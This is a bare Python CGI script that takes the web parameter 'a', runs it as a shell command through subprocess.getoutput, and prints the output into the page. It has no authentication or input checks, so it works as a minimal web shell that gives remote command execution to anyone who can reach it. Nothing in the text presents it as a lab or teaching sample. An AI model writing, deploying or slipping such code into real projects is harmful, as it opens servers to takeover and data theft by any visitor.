#!/usr/bin/python3
import cgi
import cgitb
import subprocess
cgitb.enable()
print("Content-type:text/html")
print("")
webdata=cgi.FieldStorage()
data=webdata.getvalue('a')
output=subprocess.getoutput(data)
print("<h1>")
print(output)
print("</h1>")